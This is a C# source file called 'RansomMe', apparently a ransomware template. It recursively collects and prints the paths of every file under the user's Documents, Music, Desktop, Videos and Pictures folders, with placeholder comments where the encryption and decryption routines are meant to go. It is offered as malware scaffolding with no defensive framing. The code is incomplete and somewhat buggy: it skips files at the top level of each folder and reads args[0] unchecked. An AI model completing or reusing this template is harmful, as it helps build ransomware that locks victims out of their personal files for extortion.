using System;
using System.Collections;
using System.Collections.Generic;
using System.Security.Cryptography;
using System.IO;

namespace RansomMe
{
    class Program
    {
        protected static  List<string> AlltheFiles = new List<string>();

        static void Main(string[] args)
        {
            if (args[0].ToLower().Equals("-encrypt"))
            {
                DirSearch(Environment.ExpandEnvironmentVariables(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)));
                DirSearch(Environment.ExpandEnvironmentVariables(Environment.GetFolderPath(Environment.SpecialFolder.MyMusic)));
                DirSearch(Environment.ExpandEnvironmentVariables(Environment.GetFolderPath(Environment.SpecialFolder.Desktop)));
                DirSearch(Environment.ExpandEnvironmentVariables(Environment.GetFolderPath(Environment.SpecialFolder.MyVideos)));
                DirSearch(Environment.ExpandEnvironmentVariables(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures)));
                DirSearch(Environment.ExpandEnvironmentVariables(Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory)));
                //your encrypt function here
            }
            else if (args[0].ToLower().Equals("-deencrypt"))
            {
                DirSearch(Environment.ExpandEnvironmentVariables(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)));
                DirSearch(Environment.ExpandEnvironmentVariables(Environment.GetFolderPath(Environment.SpecialFolder.MyMusic)));
                DirSearch(Environment.ExpandEnvironmentVariables(Environment.GetFolderPath(Environment.SpecialFolder.Desktop)));
                DirSearch(Environment.ExpandEnvironmentVariables(Environment.GetFolderPath(Environment.SpecialFolder.MyVideos)));
                DirSearch(Environment.ExpandEnvironmentVariables(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures)));
                DirSearch(Environment.ExpandEnvironmentVariables(Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory)));
                //your Deencrypt function here
            }
        }

        protected static void DirSearch(string dir)
        {
            try
            {
                foreach (string d in Directory.GetDirectories(dir))
                {
                    foreach (string f in Directory.GetFiles(d))
                    {
                        AlltheFiles.Add(f);
                        Console.WriteLine(f);
                    }
                    DirSearch(d);
                }
            }
            catch (System.Exception excpt)
            {
                Console.WriteLine(excpt.Message);
            }
        }
    }
}
